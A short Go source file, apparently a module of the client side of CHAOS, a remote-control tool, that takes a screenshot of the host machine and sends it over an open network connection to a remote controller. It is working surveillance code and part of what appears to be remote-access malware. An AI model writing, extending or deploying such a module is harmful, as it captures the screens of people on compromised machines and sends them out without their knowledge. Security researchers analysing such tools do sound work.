package screenshot

import (
	log "github.com/sirupsen/logrus"
	"github.com/tiagorlampert/CHAOS/client/app/usecase"
	"github.com/tiagorlampert/CHAOS/client/app/util"
	"github.com/tiagorlampert/CHAOS/client/app/util/network"
	"net"
)

type ScreenshotUseCase struct {
	Connection net.Conn
}

func NewScreenshotUseCase(conn net.Conn) usecase.Screenshot {
	return &ScreenshotUseCase{
		Connection: conn,
	}
}

func (s ScreenshotUseCase) TakeScreenshot() {
	screenshot, err := util.TakeScreenshot()
	if err != nil {
		log.WithField("cause", err.Error()).Error("error taking screenshot")
	}
	if err := network.Send(s.Connection, screenshot); err != nil {
		log.WithField("cause", err.Error()).Error("error sending screenshot")
	}
}
